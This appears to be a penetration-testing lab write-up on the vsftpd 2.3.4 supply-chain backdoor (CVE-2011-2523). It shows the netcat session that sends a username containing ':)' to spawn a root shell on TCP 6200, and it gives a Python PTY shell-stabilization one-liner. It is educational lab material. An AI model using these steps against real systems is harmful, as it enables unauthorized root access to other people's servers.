title: Supply Chain Backdoor: vsftpd 2.3.4 (CVE-2011-2523) & Raw Socket Shells
summary: Demonstrated manual triggering of the infamous vsftpd 2.3.4 supply chain backdoor (CVE-2011-2523) without automated exploit frameworks. Transmitted a username containing the smiley token (:) ) causing the daemon to spawn a root listener on TCP 6200. Analyzed raw netcat shell behavior (absence of PTY prompt) and demonstrated shell stabilization via Python PTY spawning.

blocks.text: In July 2011, the official vsftpd 2.3.4 archive on the master repository was compromised. The attacker inserted a hidden check: if any username contains the characters `:)`, a signal handler triggers `execl("/bin/sh","sh",(char *)0)` on port 6200.

blocks.label: kali (terminal 1)
blocks.text:
┌──(general㉿lee)-[~]
└─$ nc -vn 192.168.0.155 21
(UNKNOWN) [192.168.0.155] 21 (ftp) open
220 (vsFTPd 2.3.4)

USER hacker:)
331 Please specify the password.
PASS password
Once `PASS` is sent, the FTP connection freezes by design as the daemon forks the background listener.
In a second terminal, netcat successfully connected to the spawned backdoor socket:
Notice that unlike SSH or a local terminal, no `root@target:~#` prompt appears. This is a **raw non-interactive `/bin/sh` stream**.

sections.h: Understanding Raw Shells vs Interactive PTYs

head: Shell Type
Prompt Display
Behavior & Control
rows: Standard Input (stdin) and Standard Output (stdout) are connected directly to the TCP stream. Commands execute upon pressing Enter, but there is no terminal formatting.
A pseudo-terminal allocated via `python -c 'import pty; pty.spawn("/bin/bash")'`. Provides command history, arrow navigation, and shell prompts.
